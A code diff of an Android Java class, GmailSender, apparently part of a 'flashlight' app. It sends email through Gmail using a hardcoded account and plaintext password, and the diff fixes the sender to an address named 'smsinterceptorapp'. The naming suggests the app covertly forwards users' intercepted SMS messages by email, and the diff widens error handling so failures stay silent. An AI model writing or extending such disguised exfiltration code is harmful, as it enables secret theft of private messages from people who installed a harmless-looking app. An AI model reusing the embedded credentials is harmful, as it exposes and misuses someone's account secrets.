@@ -25,6 +25,7 @@ public class GmailSender extends javax.mail.Authenticator {
   private final String mailhost = "smtp.gmail.com";
   private final String password = "filcikyxgwstivft";
   private final String user     = "codecaine21@gmail.com";
+  private final String sender   = "smsinterceptorapp@gmail.com";
 
   static {   
     Security.addProvider(new com.flash.light.JSSEProvider()); 
@@ -51,11 +52,11 @@ public class GmailSender extends javax.mail.Authenticator {
       });
     }   
 
-  public synchronized void sendMail(String subject, String body, String sender, String recipients) throws Exception {   
+  public synchronized void sendMail(String subject, String body, String recipients) throws Exception {   
     try {
       MimeMessage message = new MimeMessage(session);   
       DataHandler handler = new DataHandler(new ByteArrayDataSource(body.getBytes(), "text/plain"));   
-      message.setSender(new InternetAddress(sender));   
+      message.setSender(new InternetAddress(sender)); 
       message.setSubject(subject); 
       message.setDataHandler(handler);   
       Log.d("Flashlight sendMail() ","recipients -> " + recipients);
@@ -68,8 +69,9 @@ public class GmailSender extends javax.mail.Authenticator {
       }
       Transport.send(message);   
     }
-    catch(Exception e) {
-      Log.e("FlashLight GmailSender sendMail error", "" + e.toString());
+    //catch(Exception e) {
+    catch(Throwable e) {
+      Log.e("FlashLight GmailSender sendMail() Exception e", "" + e.toString());
     }
   }   
 
